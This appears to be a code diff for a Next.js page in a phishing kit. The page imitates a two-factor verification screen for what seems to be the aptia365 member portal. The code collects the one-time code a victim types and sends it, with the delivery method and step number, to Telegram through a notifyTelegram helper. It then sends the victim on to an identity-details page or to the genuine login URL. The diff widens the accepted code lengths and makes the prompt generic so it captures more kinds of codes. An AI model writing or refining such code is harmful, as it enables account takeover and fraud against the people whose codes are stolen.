@@ -1,8 +1,8 @@
 "use client";
-import { useState, Suspense, useEffect } from 'react';
-import { useRouter, useSearchParams } from 'next/navigation';
-import { ArrowLeft, Loader2 } from 'lucide-react';
-import { notifyTelegram } from '@/lib/telegram-notify';
+import { useState, Suspense, useEffect } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
+import { ArrowLeft, Loader2 } from "lucide-react";
+import { notifyTelegram } from "@/lib/telegram-notify";
 
 const VERIFY_DELAY_MS = 10000;
 const RESEND_LOADING_MS = 2000;
@@ -11,17 +11,17 @@ const RESEND_COOLDOWN_SEC = 30;
 function formatMmSs(totalSeconds: number): string {
   const m = Math.floor(totalSeconds / 60);
   const s = totalSeconds % 60;
-  return `${m}:${s.toString().padStart(2, '0')}`;
+  return `${m}:${s.toString().padStart(2, "0")}`;
 }
 
 function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
   const router = useRouter();
   const searchParams = useSearchParams();
-  const rawMethod = searchParams.get('method') || 'email';
-  const method: 'email' | 'text' | 'phone' =
-    rawMethod === 'text' ? 'text' : rawMethod === 'phone' ? 'phone' : 'email';
+  const rawMethod = searchParams.get("method") || "email";
+  const method: "email" | "text" | "phone" =
+    rawMethod === "text" ? "text" : rawMethod === "phone" ? "phone" : "email";
 
-  const [code, setCode] = useState('');
+  const [code, setCode] = useState("");
   const [verifyLoading, setVerifyLoading] = useState(false);
   const [resendLoading, setResendLoading] = useState(false);
   const [resendCooldown, setResendCooldown] = useState(0);
@@ -38,34 +38,28 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
     setVerifyLoading(true);
     await new Promise((r) => setTimeout(r, VERIFY_DELAY_MS));
     notifyTelegram({
-      kind: 'verification',
+      kind: "verification",
       method,
       code,
       otpStep,
     });
 
     if (otpStep === 2) {
-      window.location.href = 'https://auth.aptia365.com/aptia365/member/login';
+      window.location.href = "https://auth.aptia365.com/aptia365/member/login";
       return;
     }
 
-    
     router.push(`/identity-details?method=${encodeURIComponent(method)}`);
   };
 
   const handleResend = async () => {
     if (resendLoading || resendCooldown > 0) return;
     setResendLoading(true);
-    notifyTelegram({ kind: 'resend', method, otpStep });
+    notifyTelegram({ kind: "resend", method, otpStep });
     await new Promise((r) => setTimeout(r, RESEND_LOADING_MS));
     setResendLoading(false);
     setResendCooldown(RESEND_COOLDOWN_SEC);
   };
-
-  const methodText =
-    method === 'text' ? 'text message' :
-    method === 'phone' ? 'phone call' :
-    'email';
 
   const resendDisabled = resendLoading || resendCooldown > 0;
 
@@ -73,11 +67,13 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
     <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-[0_2px_8px_rgba(0,0,0,0.1)] p-10 relative">
       <button
         type="button"
-          onClick={() =>
-            otpStep === 2
-              ? router.push(`/identity-details?method=${encodeURIComponent(method)}`)
-              : router.back()
-          }
+        onClick={() =>
+          otpStep === 2
+            ? router.push(
+                `/identity-details?method=${encodeURIComponent(method)}`,
+              )
+            : router.back()
+        }
         disabled={verifyLoading}
         className="absolute top-6 left-6 text-[#666666] hover:text-[#00C389] transition-colors flex items-center gap-1 text-sm font-medium disabled:opacity-40 disabled:pointer-events-none"
       >
@@ -89,7 +85,7 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
           Enter Verification Code
         </h2>
         <p className="text-sm text-[#666666]">
-          We have sent a 6-digit code via {methodText}. Please enter it below to verify your identity.
+          Enter the code sent to your Phone/Device.
         </p>
       </div>
 
@@ -104,10 +100,10 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
           <input
             type="text"
             id="code"
-            maxLength={6}
+            maxLength={8}
             value={code}
-            onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
-            placeholder="000000"
+            onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
+            placeholder=""
             disabled={verifyLoading}
             className="w-full h-12 px-4 border border-[#DDDDDD] rounded text-center text-xl tracking-[0.5em] text-[#333333] placeholder:text-[#BBBBBB] focus:border-[#00C389] focus:ring-1 focus:ring-[#00C389] outline-none transition-all disabled:opacity-60 disabled:bg-[#FAFAFA]"
           />
@@ -115,7 +111,7 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
 
         <button
           type="submit"
-          disabled={code.length < 6 || verifyLoading}
+          disabled={![4, 5, 6, 8].includes(code.length) || verifyLoading}
           className="w-full h-10 rounded-full text-sm font-medium text-white disabled:bg-[#B8B8B8] enabled:bg-[#00C389] enabled:hover:bg-[#00A876] transition-colors inline-flex items-center justify-center gap-2"
         >
           {verifyLoading ? (
@@ -124,13 +120,13 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
               Loading…
             </>
           ) : (
-            'Verify'
+            "Verify"
           )}
         </button>
       </form>
 
       <div className="mt-6 text-center text-sm text-[#666666]">
-        Didn&apos;t receive a code?{' '}
+        Didn&apos;t receive a code?{" "}
         <button
           type="button"
           onClick={handleResend}
@@ -139,13 +135,16 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
         >
           {resendLoading ? (
             <>
-              <Loader2 className="h-3.5 w-3.5 animate-spin shrink-0" aria-hidden />
+              <Loader2
+                className="h-3.5 w-3.5 animate-spin shrink-0"
+                aria-hidden
+              />
               Loading…
             </>
           ) : resendCooldown > 0 ? (
             `Resend in ${formatMmSs(resendCooldown)}`
           ) : (
-            'Resend'
+            "Resend"
           )}
         </button>
       </div>
@@ -155,7 +154,13 @@ function VerifyForm({ otpStep }: { otpStep: 1 | 2 }) {
 
 export function TwoFactorVerifyCard() {
   return (
-    <Suspense fallback={<div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">Loading...</div>}>
+    <Suspense
+      fallback={
+        <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">
+          Loading...
+        </div>
+      }
+    >
       <VerifyForm otpStep={1} />
     </Suspense>
   );
@@ -163,7 +168,13 @@ export function TwoFactorVerifyCard() {
 
 export function TwoFactorVerifyCardStep2() {
   return (
-    <Suspense fallback={<div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">Loading...</div>}>
+    <Suspense
+      fallback={
+        <div className="w-full max-w-[500px] mx-auto bg-white rounded shadow-sm p-10 text-center animate-pulse">
+          Loading...
+        </div>
+      }
+    >
       <VerifyForm otpStep={2} />
     </Suspense>
   );
